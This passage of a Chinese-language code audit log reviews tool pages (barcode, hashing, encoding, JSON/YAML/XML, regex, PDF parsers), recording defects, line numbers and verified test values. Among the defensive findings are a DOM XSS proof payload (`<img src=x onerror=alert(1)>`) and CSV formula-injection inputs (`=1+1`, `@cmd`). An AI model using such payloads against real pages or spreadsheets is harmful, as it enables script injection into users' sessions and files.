| `tools/it/barcode-code128.html` | 静区单位错位：`:272` 传 `quiet:10`，`js/barcode-lib.js:343` 定义了却从未使用的 `quietModules()`，`:349-351` 把 `quiet` 当像素加在 `bits.length*scale` 两侧；`scale=2` 时仅 5 模块，低于 Code 128 规范 10 模块。同型：EAN/UPC 页 10px≈3.3 模块（规范 9–11），打印/贴标时四周留白不足；SVG 路径同样按 `q*2` 处理。 | IT-D08 |

**统计**
- 页数：10（QR 族 5 + 条码族 5）。
- 新增问题：8 条——高 1（IT-D01）/ 中 7（IT-D02–IT-D08）；编号区间 IT-D01–IT-D08，连续、无重号，与既有 IT-N 系列不混号。
- 复核既有：伪实现 3 页（IT-N520/N521/N550，高）；Code39 IT-N507–IT-N509；MSI IT-N510–IT-N512；UPC IT-N127–IT-N129；Code128 IT-N125；qrcode IT-N260。另确认 IT-N258 已由 `:430-432` 修复（UTF-8 编码），IT-N73/N84 已由 `:255-268` 修复（长度/校验位校验），三处可销案。
- 假工具：3 个（`email-qr`、`location-qr`、`text-qr`），均沿用既有高优编号，不重复计数。
- 安全条目：0 条——10 页无 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户文本均经 `escapeHtml`（`qr-decoder.html:249`、`email-qr.html:293`、`text-qr.html:280`、`barcode-msi.html:286`、`barcode-code39.html:323`），仅存主题/表单偏好于 localStorage（无敏感值）。`qrcode.html:473` 把 `e.message` 直接写入 innerHTML，但库异常文案为静态常量，不可控，未计入。
- 方法：逐页通读 HTML 与全部内联 JS；`node -e` 验证 EAN G 表为标准 G 的反码（`reverse(L)` vs `EAN_G`）、Code39 `0` 为 15 元素/25 模块（标准 9/15）、`unescape('%E4%B8%AD')` 为 `ä¸­`、Code128 表 107 项且 Stop 13 模块；未开浏览器、未跑构建/门禁、未执行 git、未修改任何 `tools/**` 或构建产物。

## AB 批 · IT 族矩阵：哈希/加密/编码（2026-11-04）

> 页面名后的「（死键 N）」= 该页第三层英文词典（`i18n/tools/en/<ind>/<slug>.json`）高优先死键数（来源 `plan/i18n-dead-keys.md`）；各线改本页时顺手清理，本批不修英文。

本轮只读复扫 `tools/it/` 下 md5/sha/base64/base32/hex/rc4 6 页，覆盖摘要、编码、流密码三个子类。默认态：md5/sha/base64/hex/base32 五页加载即自动计算，逐一对标准工具复算均正确；rc4 不自动运行，无默认输出。

### 矩阵

| 页面 | 实现方式（共享库/自写/伪/回显） | 可验证性（标准工具复算） | 结论 |
|---|---|---|---|
| `md5.html`（死键 5） | 自写 MD5（charCode 分块；文件走 FileReader 整包） | ✅ 全部一致：`node:crypto` 复算默认 `Hello, MD5!`=`383e139e64e5f46de9d03ba3695da2d8`、`abc`=`900150983cd24fb0d6963f7d28e17f72`、空串=`d41d8cd98f00b204e9800998ecf8427e`；页面 `hmacMd5('mysecret','Hello, HMAC-MD5!')`=`f8d020bdc5de08ea93f68ad045c6d01c`，80 字节长密钥亦与 `createHmac` 一致 | 算法正确，默认文本/HMAC 输出正确；仅「任意大小文件」承诺未兑现（②） |
| `sha.html`（死键 0） | 共享原生 `crypto.subtle.digest` | ✅ 一致：SHA-256(`Hello, SHA!`)=`be54d2492206f27aed3e7f822d24bd5f4f477177b712bed37c762bbad3bd2d25`，`abc`=`ba7816…0015ad`（node） | 计算正确；但承诺的 SHA-224 与「分块计算」均未实现（②） |
| `base64-converter.html`（死键 0） | 自写 Base64（TextEncoder+btoa）、Base32、Base85 | ✅ 一致：默认 `Hello, World! 你好，世界！`→`SGVsbG8sIFdvcmxkISDkvaDlpb3vvIzkuJbnlYzvvIE=`；Base32 `Hello`→`JBSWY3DP`；Base85 去掉 `<~ ~>` 包裹后与 Python `a85encode` 逐字节一致（`Hi`→`88/`，`中文`→`jLD>SQA5`），标准解码器可互通 | 三种编码正确，默认自动编码结果正确 |
| `hex-encode.html`（死键 0） | 自写 TextEncoder + `toString(16)` | ✅ 一致：默认 `Hi`→`0x4869`；`中文`→`e4b8ade69687`（node） | 编码与默认输出正确；解码不接受逐字节 0x 前缀 |
| `rc4.html`（死键 0） | 自写 RC4 KSA/PRGA + drop | ✅ 一致：独立参考实现比对 `mysecretkey`、`secret123`、`anotherkey`、`rc4test`，drop 0/768/2048、中文与空串共 7 例全等 | 算法正确；页面不自动运行；解密输入判定有实质缺陷 |
| `base32-encode.html`（死键 0） | 自写 5 位位流编码 | ✅ 一致：`Hello`→`JBSWY3DP`、`f`→`MY======`、`中文`→`4S4K3ZUWQ4======`（RFC 4648 参考实现） | 编码与默认输出正确；解码静默接受非法长度 |

### 逐页结论

- `md5.html`：MD5 主循环与 HMAC（含 >64 字节密钥取原始摘要）均与 node 一致，`md5Bytes` 走字节数组亦正确；唯一问题是文件模式把整份文件读入 `ArrayBuffer`（`:439-448`）却宣称「支持任意大小文件」（`:202`），大文件存在内存失败风险。
- `sha.html`：真正调用 WebCrypto，SHA-256 默认结果与 node 一致，无伪实现；但 SEO 正文/SoftwareApplication JSON-LD 与算法说明均宣称 SHA-224（`:54,172,481`）而选择器只有 SHA-1/256/384/512（`:189-192`），文件区宣称「分块计算」（`:224`）实际是 `file.arrayBuffer()` 整包读取（`:369`）。
- `base64-converter.html`：Base64/Base32/Base85 三套编解码均正确，Base32 解码还带剩余位非零校验；Base85 末组用 0 填充（与 Python `a85encode` 相同，非 Adobe 的 `u` 填充），两种解码器均可正确还原。`autoDetect` 勾选实际只在解码时剥离 `data:` 前缀（`:682-684`），并无「输入类型自动检测」。
- `hex-encode.html`：UTF-8→字节→两位 hex 正确，默认 `0x4869` 正确；`dec()` 只剥离行首一个 `0x`（`:290`），粘贴常见 `0x41 0x42` 会被判非法字符而非解码。
- `rc4.html`：KSA/PRGA 与 drop-N 实现与独立参考逐字节一致；但解密用 `/^[0-9a-fA-F\s]+$/` 先判 Hex（`:383-387`），把恰为纯十六进制字符的 Base64 密文误当 Hex——实测明文 `328`、默认密钥加密得 Base64 `2eFA`，再解密输出乱码而非 `328`。另 `TextDecoder(..., {fatal:false})` 永不抛错，`:401-403` 的 Hex 回退是死代码，错误密钥/二进制密文只显示 U+FFFD 替换字符。
- `base32-encode.html`：编码位流正确，默认 `Hello`→`JBSWY3DP`；`base32ToBytes`（`:271-285`）既不校验末组剩余位，也不校验长度，`JB`→`H`、`JBSWY3D`→`Hell` 均静默返回截断结果（同站 `base64-converter.html:481-482` 的 Base32 解码反而有该校验）。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/base32-encode.html` | 解码缺剩余位/长度校验（`:271-285`）：`JB`→`H`（剩 2 位被丢）、`JBSWY3D`→`Hell`（剩 3 位被丢），非法或截断输入静默产出错值，不报错。 | IT-D09 |
| `tools/it/rc4.html` | 解密先按 Hex 判定（`:383-387`）：全 hex 字符的 Base64 密文被误解析；实测明文 `328`、key `mysecretkey` 加密得 `2eFA`，解密时被当作 hex 字节 `2E FA` 处理，输出乱码而非 `328`，加解密往返不闭合。 | IT-D10 |
| `tools/it/rc4.html` | `TextDecoder('utf-8',{fatal:false})`（`:399-403`）不会抛异常，`catch` 的 `bytesToHex` 回退为死代码；错误密钥或二进制密文输出 U+FFFD 替换串，用户无法得到原始 hex。 | IT-D11 |
| `tools/it/hex-encode.html` | 解码仅 `replace(/^0x/i,'')` 一次（`:290`），而说明称「自动忽略 0x 前缀」（`:190`）；`0x41 0x42` 清洗后成 `410x42` 被判非法字符，常见逐字节 0x 格式不可用。 | IT-D12 |
| `tools/it/sha.html` | 承诺 SHA-224 但未提供：正文与 JSON-LD 列 SHA1/SHA224/SHA256/SHA384/SHA512（`:54,172,481`），算法选择器仅 4 项、无 SHA-224（`:189-192`）。 | IT-D13 |
| `tools/it/sha.html` | 文件区称「支持大文件，分块计算」（`:224`），实现为 `await file.arrayBuffer()` 整包读取（`:369`），并未分块流式处理。 | IT-D14 |
| `tools/it/md5.html` | 文件区称「支持任意大小文件」（`:202`），实现 `reader.readAsArrayBuffer(file)` 一次性读入内存（`:439-448`），超大文件易失败且无分块。 | IT-D15 |
| `tools/it/base64-converter.html` | 「自动检测输入类型」勾选框（`:208`）实际只在解码时剥离 data URI 前缀（`:682-684`），不判断编码/解码方向，也不识别 Base32/85，标签超出实现。 | IT-D16 |
| `tools/it/rc4.html` | 安全（明文存密）：TBKit 历史把 `key`、`input`、密文一并写入 localStorage（快照 `:452-462`、`record` `:537-541`）；`md5.html` 的 `hmacKey` 同型（`:477-482,561-563`），密钥长期明文留存。 | IT-D17 |
| `tools/it/base64-converter.html` | 安全（明文留存）：加载即 `encodeText()`（`:968-970`）并 `addHistory`（`:601-614`），未操作也会把输入/输出前 200 字写入 localStorage；粘贴令牌/密钥会被持久化，界面无提示。 | IT-D18 |

**统计**

- 页数：6（摘要 2 + 编码 3 + 流密码 1）；默认自动计算 5 页，rc4 无默认输出。
- 新增问题：10 条——① 高优 4（IT-D09–IT-D12）/ ② 假工具增量 4（IT-D13–IT-D16）/ ③ 安全 2（IT-D17–IT-D18）；编号 IT-D09–IT-D18 连续、无重号，接续上批 IT-D08。
- 复核既有：未发现本族 6 页存在伪实现或回显页；md5/sha 摘要与 rc4 密码学核心均经独立实现复算一致，`base64` 页 Base32/Base85 亦经 RFC 4648 / Python `a85` 交叉验证。
- 安全：无 `eval`/`new Function`/`allow-same-origin`/可控 DOM 注入；用户文本均走 `textContent`、`escHtml` 或定长 hex 输出。模板级 `lf1-cdn-tos.bytegoofy.com/ttzz` 第三方脚本在本批 6 页均存在（如 `md5.html:122`、`rc4.html:114`），属全站通用问题，已在既有审计（本文件 `:2180`）登记，不重复计数。
- 方法：`node:crypto` 复算 MD5/SHA-256/HMAC；`vm` 提取 `md5.html` 原脚本执行（含 UTF-8、中文、长密钥）；自写独立 RC4 参考与页面实现逐字节比对（含 drop 768/2048）；Python `base64.a85encode` 校验 Base85 末组填充；未开浏览器、未跑 `_build.py`/门禁、未执行 git、未修改 `tools/**`、js/css/json 或构建产物。

## AB 批 · IT 族矩阵：文本/数据格式（2026-11-04）
> 页面名后的「（死键 N）」= 该页第三层英文词典（`i18n/tools/en/<ind>/<slug>.json`）高优先死键数（来源 `plan/i18n-dead-keys.md`）；各线改本页时顺手清理，本批不修英文。

本轮只读复扫 `tools/it/` 下 `json-formatter` / `yaml-validator` / `xml-validator` / `json-to-csv` / `text-diff` / `markdown-lint` 共 6 页，覆盖 JSON 格式化压缩、YAML、XML、CSV↔JSON、文本 diff、Markdown lint（避开已转修复的 json-path / rich-text-editor / code-runner）。默认态：5 页加载即自动出结果（`json-formatter:727` loadSample、`yaml-validator:733-738` 初始化即 validateNow、`xml-validator:281` calcTool、`json-to-csv:410` Boot 内 toCSV、`markdown-lint:241` calcTool），`text-diff` 无默认输出（`:666` 提示先点「开始对比」）。默认结果抽验：json 样例合法并渲染树/统计；YAML `SAMPLE_YAML` 验证通过；XML 默认 4 元素、根 `note` 通过；CSV 默认 2 行×3 列；Markdown 默认 2 条（缺空格列表 + 空链接）。

### 矩阵

| 页面 | 实现方式（自写解析/库/正则伪解析/回显） | 可验证性（注释/根元素/CDATA/转义/深层嵌套是否保真） | 结论 |
|---|---|---|---|
| `json-formatter.html`（死键 4） | 原生 `JSON.parse` / `JSON.stringify` + 自写递归树渲染；无第三方库 | 美化/压缩/排序/反转义结构往返等价（`{"a":1,"b":"x\"y"}`、3 层嵌套、中文与 ASCII 均等）；缩进 2/4/Tab/0 生效；「转义」对合法 JSON 与「压缩」输出逐字节相同，不生成转义串；「提取」对同段两个对象只返回第一个 | 解析真实、无伪实现；转义名不符实、提取不完整（②） |
| `yaml-validator.html`（死键 0） | `js-yaml@4.1.0`（jsdelivr CDN，SRI 锁版）`loadAll` | ✅ 多键嵌套、多文档 `---`、锚点/合并键 `<<`、literal/folded 多行块标量、Tab 缩进报错、重复键报错位置准确；⚠ 非字符串键 `2024-01-01:` 被序列化成**本地时区 Date 字符串**作 JSON 键（随 TZ 漂移），`!!binary` 输出 `{"0":104,…}` 索引对象；循环锚点被 `stringify` 捕获并提示 | 解析真实；YAML→JSON 键名/类型失真（①）；CDN 依赖弱网误报见备注 |
| `xml-validator.html`（死键 0） | 浏览器原生 `DOMParser('application/xml')` | ✅ CDATA、实体转义、200 层嵌套、注释内 `<`、中文标签、重复属性、未闭合标签、未声明命名空间前缀判定均正确；`<!DOCTYPE … SYSTEM>` 实体引用报 `undefined entity`（不取外部实体，XXE 安全）；默认样例根 `note`、4 元素通过；⚠ 合法根元素 `<parsererror>` 被判「格式错误」 | 原生解析无伪；`parsererror` 检测误判（①） |
| `json-to-csv.html`（死键 0） | 原生 `JSON.parse` + 自写 RFC 4180 引号转义 | ✅ `A, B`、`say "hi"`、单元格内换行、嵌套对象串、null/缺失键经 Python `csv` 回读为 4 行×4 列，值逐格一致；⚠ `=1+1`、`@cmd` 原样输出未做公式前缀转义 | 序列化正确、无丢列；未防 CSV 公式注入（③）；既有 IT-N6/N7 复核仍成立 |
| `text-diff.html`（死键 0） | 自写 LCS（DP 表）+ 递归回溯；字符级按 `Array.from` 码点切分 | ✅ 2000 行/2 行内差异编辑脚本可精确重建两文本（same+remove=旧、same+add=新）；⚠ 4000 行全不同文本、单行 5000 字符均抛 `RangeError: Maximum call stack size exceeded`，`doDiff` 无 try/catch 兜底 | 算法正确但规模即崩（①）；忽略空白/大小写仅作用于比较、显示保留原文，正确 |
| `markdown-lint.html`（死键 0） | 纯行正则伪解析（无 CommonMark/remark 解析器） | ✅ 默认样例命中 2 条；⚠ `---` 前置元数据、行首 `*斜体*` 被误报「列表符号后缺空格」；`#标题`（井号后无空格）、行尾空格、未闭合代码块、嵌套列表缩进 MD007 均无检出 | 宣称的 3 项检查未实现 + 误报/漏报（②）；另有 `:120` 畸形 `</div` 备注 |

### 逐页结论

- `json-formatter.html`：JSON 解析与格式化真实，`sortKeys` 递归按键排序且数组元素同步排序，`renderTree` 对键/值一律 `escapeHtml`，无注入面。但「转义」按钮（`:612-623`）对合法 JSON 走 `JSON.parse`→`JSON.stringify(obj)`，与「压缩」（`:561-571`）输出完全相同，只有输入不是 JSON 时才 `JSON.stringify(string)`；「反转义」期望的是 JSON 字符串字面量，因此「转义→反转义」对合法 JSON 只相当于压缩再美化，按钮语义不成立。「提取」（`:640-678`）用贪婪 `{[\s\S]*}` 从首个 `{` 取到全文最后一个 `}` 后自尾截断，日志中多个 JSON 片段只能拿到第一个，与「从日志/代码片段自动提取」的说明不符。默认态 `loadSample()`（`:727`）即渲染 2 空格美化树、类型统计与柱状图，结果正确。
- `yaml-validator.html`：核心是 js-yaml 4.1.0 `loadAll`（`:479,698`），多文档、锚点、合并键、多行块、Tab/重复键报错（含行列与上下文）均与库行为一致，2 MB 上限（`:511`）有保护，循环引用被 `stringify` 的 catch 兜住（`:574-581`）。缺陷集中在「YAML→JSON 保真」：js-yaml 会把 `2024-01-01` 解析为 `Date`，作为 mapping 键时经 JS 键强制转换成本地时区 `Date.toString()` 串（实测 `Mon Jan 01 2024 08:00:00 GMT+0800 (中国标准时间)`），换时区/语言环境键名就变；`!!binary` 为 `Uint8Array`，`JSON.stringify` 得 `{"0":104,…}` 索引对象而非 base64；正文称「遵循 YAML 1.1/1.2 规范」（`:191`），实际 js-yaml 4 为 1.2 语义（`yes/on` 输出字符串，实测），1.1 用户预期落空。备注：js-yaml 走 CDN，弱网/离线时 `ReferenceError` 被 catch 后显示成「YAML 语法验证失败：jsyaml is not defined」，与既有 G09/IT-N2 外部依赖问题同型，不另编号。
- `xml-validator.html`：直接把输入交给原生 `DOMParser`（`:266`），只以 `getElementsByTagName('parsererror')` 数量判成败（`:267-271`），再取 `documentElement.tagName` 与元素总数（`:273-275`），不输出 DOM/文本，故无往返保真问题，也不会丢数据。CDATA/转义/200 层嵌套/重复属性/未闭合标签/未声明前缀/中文标签均判定正确；`DOCTYPE SYSTEM` 的外部实体不解析（报 undefined entity），XXE 面安全。唯一实质缺陷是 `<parsererror>` 判定按限定名跨命名空间匹配：合法文档根就叫 `<parsererror>` 时会被当成解析失败（jsdom 复算为 ❌、detail 输出正文 `valid`），Chrome/Firefox 同一 DOM 接口同样命中（浏览器未实测）。默认样例（`:119`）结构正常，`calcTool()`（`:281`）加载即输出 ✅ 根 `note`、4 元素。
- `json-to-csv.html`：`toCSV`（`:271-295`）先并集收集所有键作表头，`cell` 一律加双引号并把内部 `"` 翻倍（`:282-286`），对象/数组用 `JSON.stringify`；实测含逗号、双引号、换行、嵌套对象的 3 行数据经 Python `csv.reader` 回读 4×4 完全一致，列数稳定。缺陷：`cell` 不处理 `=`/`+`/`-`/`@` 开头值，导出后 Excel 会按公式解析（加引号不阻止），构成 CSV 注入；`!Array.isArray` 分支（`:277`）只改提示不清空 `#output`，空数组/非数组时旧 CSV 仍在，复制/下载可导出上一份数据（IT-N6 仍成立）；对象字段仍 `JSON.stringify` 未展开，与文案不符（IT-N7 仍成立）；历史回填仍直接调 `downloadCSV()`（`:356`）。默认态 Boot 调 `toCSV()`（`:410`），预填 2 行×3 列结果正确。
- `text-diff.html`：LCS DP 与回溯实现真实，行级差异再合并 remove+add 为 modify，字符级用码点切分（emoji 不拆半），全部输出走 `ToolBox.escHtml`，统计口径（modify 计 1 增 1 删、总数去重）正确；默认无自动对比。致命点是 `backtrack` 为纯递归（`:441-457`），且未做规模限制或 try/catch：实测 4000 行全不同文本、单行 5000 字符均 `RangeError`，同时 `lcsLength` 的 `m×n` 二维数组在 4000×4000 时内存压力也很大；用户对两个较大文件点「开始对比」会无结果/脚本中断。历史记录只存前 1000 字符（`:698-704`）且提供清除按钮，按既有口径不另计安全项。
- `markdown-lint.html`：实现是逐行正则（`:213-241`），仅覆盖标题跳级、标题重复（跨层级同文本也报，偏严）、`^\s*[-*]\S` 列表缺空格、空链接四类。正文 `:108` 宣称的「列表缩进是否一致」「行尾多余空格」「代码块是否标注语言」三项均无对应代码，`:151` 的公式表还标了 MD007 嵌套列表对齐。实测误报：`---` YAML 前置元数据与行首 `*斜体*` 都被判「列表符号后缺空格」；漏报：`#标题`（无空格，不渲染为标题）零提示，行尾空格、未闭合代码块、嵌套缩进全不检查——既漏又误，是名实不符的风格辅助器。另 `:120` 有一处畸形 `</div`（缺 `>`），jsdom 解析后 `.toolbar` 元素数为 0，按钮失去工具栏包裹（布局退化，非功能中断），属标记缺陷、未计入三类问题。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/text-diff.html` | `backtrack` 纯递归无深度上限（`:441-457`），dp 为 O(m×n)；实测 4000 行全不同文本与单行 5000 字符均抛 `RangeError: Maximum call stack size exceeded`，`doDiff`（`:484-532`）无 try/catch，大文本对比直接中断、无结果。 | IT-D19 |
| `tools/it/xml-validator.html` | 以 `getElementsByTagName('parsererror')`（`:266-271`）判失败，该接口按限定名跨命名空间匹配；合法文档根为 `<parsererror>` 时被误判「格式错误」（jsdom 复算 `<parsererror><msg>valid</msg></parsererror>` → ❌、detail 为 `valid`）。 | IT-D20 |
| `tools/it/yaml-validator.html` | YAML→JSON 直接 `JSON.stringify`（`:574`）未规范化键/类型：`2024-01-01:` 键输出本地时区 `Date.toString()` 串（实测 `Mon Jan 01 2024 08:00:00 GMT+0800 (中国标准时间)`，随 TZ 变化），`!!binary` 输出 `{"0":104,…}` 索引对象；转换结果不可移植、语义丢失，页面无提示。 | IT-D21 |
| `tools/it/json-formatter.html` | 「转义」（`:612-623`）对合法 JSON 等于 `JSON.stringify(JSON.parse(x))`，与「压缩」（`:561-571`）输出逐字节相同，不产生可嵌入的转义字符串；仅非法文本走字符串转义，与「反转义」（`:625-638`）不成对，按钮名不符实。 | IT-D22 |
| `tools/it/json-formatter.html` | 「提取」贪婪匹配 `/\{[\s\S]*\}/`（`:649-667`）从首个 `{` 到全文最后一个 `}` 后自尾截断；实测 `日志: {"a":1} 后续 {"b":2}` 仅得 `{"a":1}`，同段第二个对象不可达，与「从日志/代码片段提取」不符。 | IT-D23 |
| `tools/it/markdown-lint.html` | 正文宣称检查「列表缩进一致 / 行尾多余空格 / 代码块语言标注」（`:108`，`:151` 另标 MD007），`calcTool`（`:213-241`）仅实现 4 类；实测 `---` 前置元数据与行首 `*斜体*` 误报「列表符号后缺空格」，`#标题`（井号后无空格）、行尾空格、未闭合代码块、嵌套缩进均漏报。 | IT-D24 |
| `tools/it/json-formatter.html` | 安全（明文留存）：模板持久化脚本（`:788-818`）对全部 `textarea` 绑定 input/change 写 `localStorage`（`tb_uxp_tools/it/json-formatter.html#input`），加载时静默回填；粘贴含 token/密钥的 JSON 长期明文留存，界面无提示与关闭开关。 | IT-D25 |
| `tools/it/json-to-csv.html` | 安全（CSV 注入）：`cell()` 只做引号转义（`:282-286`），不转义 `=`/`+`/`-`/`@` 起始值；实测 `=1+1`、`@cmd` 原样输出，加引号不阻止 Excel 公式解析，导出文件可被触发表格公式/外链命令。 | IT-D26 |

**统计**

- 页数：6（JSON 格式化 1 + YAML 1 + XML 1 + CSV↔JSON 1 + 文本 diff 1 + Markdown lint 1）；默认自动出结果 5 页，`text-diff` 无默认输出。
- 新增问题：8 条——① 高优 3（IT-D19–IT-D21：递归崩溃 1、XML 误判 1、YAML 转换失真 1）/ ② 假工具增量 3（IT-D22–IT-D24）/ ③ 安全 2（IT-D25–IT-D26）；编号 IT-D19–IT-D26 连续、无重号，接续上批 IT-D18。
- 复核既有：`json-to-csv` 的 IT-N6（空/非数组不清空旧输出，`:277`）与 IT-N7（嵌套不展开、历史回填触发下载，`:284,356`）仍成立，按页计不重复编号。
- 伪实现排查：6 页中 4 页用原生解析或正式库（`JSON.parse` ×2、`DOMParser`、`js-yaml`），`text-diff` 为自写 LCS（真实但崩溃），`markdown-lint` 为正则伪解析且宣称项缺失；无回显式假工具。
- 安全：无 `eval`/`new Function`/`allow-same-origin`；用户文本输出均走 `textContent` / `ToolBox.escHtml`。`xml-validator` 不解析外部实体（XXE 安全），`yaml-validator` 不落盘。模板级 `lf1-cdn-tos.bytegoofy.com/ttzz` 第三方脚本本批 6 页均存在（如 `json-formatter:182`、`markdown-lint:71`），属全站通用问题、已登记，不重复计数。
- 方法：`/tmp` 用与页面同版本 `js-yaml@4.1.0` 复算多键/多文档/锚点/日期键/`!!binary`；jsdom `DOMParser` 复算 XML（CDATA/转义/200 层/`parsererror` 根/实体）；Node 原样提取 LCS+回溯与正则跑规模与误报用例；Python `csv.reader` 回读 CSV 校验引号内逗号/换行；未开浏览器、未跑 `_build.py`/门禁、未执行 git、未修改 `tools/**`、js/css/json 或构建产物。

## AC 批 · 正则族（2026-11-04）

### 族矩阵

| 页面 | 实现方式 | 可逆或可验证 | 结论 |
|---|---|---|---|
| `tools/it/regex` | 原生 RegExp：Worker 内 `new RegExp(p,f)`，替换同引擎（`:850-877`） | 同构造可验证 | 核心匹配/分组/替换正确；既有 N253/N254 仍在 |
| `tools/it/regex-cheatsheet` | 纯查表：静态 `COMMANDS` 数组 + 过滤（无执行） | 仅内容正确性 | 检索可用；含 JS 不支持语法 |
| `tools/it/regex-common` | 查表（8 条类别常量）+ 原生 RegExp 逐类执行 | 给定类/文本可验证 | 类别下拉为空，8 类仅 email 可达 |
| `tools/it/regex-escape` | 自写逐字符映射转义/反转义，不走 RegExp | 部分可逆 | 转义正确；反转义吞类别转义 |
| `tools/it/regex-visualizer` | 自写逐字符 tokenizer + 线性「状态」列表（非 AST/NFA），仅 `new RegExp` 校验合法性 | 合法性可验证；结构不可逆 | 承诺的树状层级未实现 + DOM XSS |

### 独立实现 vs 共享实现

- **独立 2 页**：regex（Worker 原生引擎）、regex-visualizer（自写 tokenizer）。
- **共享模板 3 页**：regex-cheatsheet 与 regex-common 同属 `COMMANDS/escapeHtml/filter/dataGrid` 速查表脚手架（与 nginx/sql 等 20+ 速查页同源）；regex-escape 的 `esc/unesc` 骨架与 css-escape、url-parser 同源。
- 结论：5 页 3 种实现范型（原生引擎 / 查表 / 自写字符串处理），无两页共享同一正则实现。

### 逐页结论

- **regex**：默认 `\d+`/`g`/含 123、456、8888、9999 的文本 → 4 条匹配正确；`escapeHtml` 覆盖全部输出（`:547/566/578/602/642`），无 XSS；`:727` 早于 `#rx-worker-src`（`:850`）调用，首屏短暂显示「组件未加载」（IT-N252 的超时部分已修，双跑仍成立）。
- **regex-cheatsheet**：纯查表；`\A \Z` 在 JS 中是字面 A/Z（node：`/\AHello/` 命中「AHello」）；`[:alpha:]` 为 POSIX 语法，JS 不支持且未注明（IT-D30）。
- **regex-common**：默认文本 4 token、`cat` 为空 → fallback email → 2 条；结果本身对，但类别选择器 `select` 无任何 `<option>`，8 类仅 email 可达（IT-D27）。
- **regex-escape**：默认 `Hello (World)? [a-z]+ $19.99` → `Hello \(World\)\? \[a-z\]\+ \$19\.99` 正确；反转义 `\d+\w`→`d+w`（IT-D29）。
- **regex-visualizer**：默认 `^a[0-9]+b$` → 10 token / 12 状态直线（node 复算），与「树状、分组/量词/字符类层级」不符（IT-D28）；token 标签原样拼 innerHTML，合法正则 `<img src=x onerror=alert(1)>` 渲染即执行（IT-N348 仍成立）。

### 问题清单（新增）

| 编号 | 页面:行 | 级别 | 问题与期望值 |
|---|---|---|---|
| IT-D27 | `tools/it/regex-common.html:127,269,323,333` | 高 | `<select id="cat"></select>` 全文件 0 个 `<option>`，`getElementById('cat').value\|\|'email'` 恒取 email → 手机/URL/IPv4/日期/身份证/用户名/中文 7 类永不生效。期望构建 8 个 option 并随选切换（默认文本下任何选择都只出 abc@example.com、test@mail.cn） |
| IT-D28 | `tools/it/regex-visualizer.html:250-266,283-285` | 高 | `buildStates` 每个 token 建 1 状态并首尾串联，无分支、无分组/量词/字符类嵌套；默认 `^a[0-9]+b$` 得直线而非树。期望真实 AST/NFA 树渲染 |
| IT-D29 | `tools/it/regex-escape.html:310` | 中 | `default: out += n` 丢弃反斜杠：`\d+\w`→`d+w`、`\b`→`b`、`\s`→`s`，反转义后正则语义反转。期望保留 `\d \w \b \s \p{…}` 原样 |
| IT-D30 | `tools/it/regex-cheatsheet.html:419-424,582-584` | 中 | `\A \Z` 标「字符串首/末」，JS 无此锚点；`[:alpha:]` 为 POSIX，JS 不支持且未注明引擎。期望标注 JS 不支持或删除 |

### 统计

- 页数 **5**；独立实现 **2** / 共享模板 **3**。
- 新增 **4** 条（高 **2** / 中 **2** / 假 **0** / 安全 **0**）；编号 IT-D27–IT-D30。
- 复核既有：IT-N253（base64 `+` 被 URLSearchParams 解成空格）、IT-N254（替换/复制恒补 `g`）、IT-N348（visualizer DOM XSS）仍成立；IT-N252 的超时部分已失效（`:492-521` Worker + 800ms），「每次按键跑两遍」仍成立（`#flags` 内联 oninput 与 `:465` 双绑）。
- 复算方式：`/tmp` node 同构造跑默认用例与 `\A`/`[:alpha:]` 语义，`new RegExp` 校验；未开浏览器、未跑 `_build.py`/门禁、未改仓库文件。

## AC 批 · PDF/文件解析族（2026-11-04）

### 族矩阵

| 页面 | 实现方式 | 可逆或可验证 | 结论 |
|---|---|---|---|
| `tools/office/pdf-merge` | pdf-lib@1.17.1 `copyPages` + `save` | node 实测 2+3 页合并成 5 页、尺寸正确 | 真处理；加密文件预检有缺陷 |
| `tools/office/pdf-split` | pdf.js 渲染缩略图 + pdf-lib 提取页 | 页数/旋转/顺序可验证 | 真提取；只产 1 个文件、强制升序 |
| `tools/office/pdf-rotate` | pdf.js 预览 + pdf-lib `setRotation`/`save` | node 回读角度 [90,270] 正确 | 真处理，未发现缺陷 |
| `tools/it/pdf-signature-checker` | 自读字节 + 正则匹配 `/ByteRange`、`/Contents` | 构造字节可验证 | 只判签名存在，无密码学验签 |
| `tools/it/properties-parser` | 自写逐行扫描 + 转义还原 | node 7 组用例 | 真解析；CRLF/`\u`/续行有错 |
| `tools/it/ini-parser` | 自写 `indexOf('=')` 逐行解析 | node 7 组用例 | 真解析；不支持 `:` 与无值键 |
| `tools/it/curl-parser` | 正则分词 + 选项表 | node 9 组命令 | 真解析；续行/转义/urlencode 有缺陷 |
| `tools/it/plist-parser` | 原生 `DOMParser` 解析 XML plist | 默认 SAMPLE 可验证 | 真解析（binary plist 明确不支持） |
| `tools/it/user-agent-parser` | 正则抽取浏览器/引擎/OS/设备 | UA 用例可复现 | 覆盖不足（微信、CriOS 等） |

### 独立实现 vs 共享实现

- **共享 3 页**：pdf-merge、pdf-split、pdf-rotate 共用同一条 `pdf-lib@1.17.1` CDN（带 SRI）；后两页另共用 `pdf.js 3.11.174` 与同一 worker 源 → CDN/worker 失效或库升级时 3 页同时受影响。
- **独立 6 页**：两个解析族与签名检查器各自实现，互不共享解析核心，只共用 Tab/历史/图表模板 → 缺陷不同源，可分别修。
- 同源风险集中在 properties 与 ini 两个键值格式解析器：行切分/去空白/重复键策略各写各的，口径不一致（`host:localhost` 在 properties 正确、在 ini 整行丢弃）。

### 逐页结论

- **pdf-merge**：真实合并并正确转义文件名；加密 PDF 预检用 `ignoreEncryption` 判为可用，`copyPages` 不解密 → 与「跳过并继续」承诺不符（IT-D32）。
- **pdf-split**：真实提取、真实缩略图；但只产 1 个 PDF、结果强制升序，与「拆成多个文件」「按填写顺序」矛盾（IT-D34/IT-D35）；历史回填触发下载（IT-D36）。
- **pdf-rotate**：真旋转，预览叠加差值、写入绝对角度，回读一致，本轮无缺陷。
- **pdf-signature-checker**：仅检测签名存在；文件头 `%PDF-49.46` 恒不匹配判红（既有 `it.md:2582`）、字节数算式错（既有 `:2588`）、PKCS#7 验签承诺未实现（既有 `:2593`）。
- **properties-parser**：核心扫描正确；CRLF 的 `\r` 留在每个值尾（IT-D33）、`\uXXXX` 不解码（既有 `:140`）、行尾 `\\` 当续行（既有 `:141`）。
- **ini-parser**：节/注释/重复键正常；`:` 分隔与无值键不支持（IT-D39/IT-D40）。
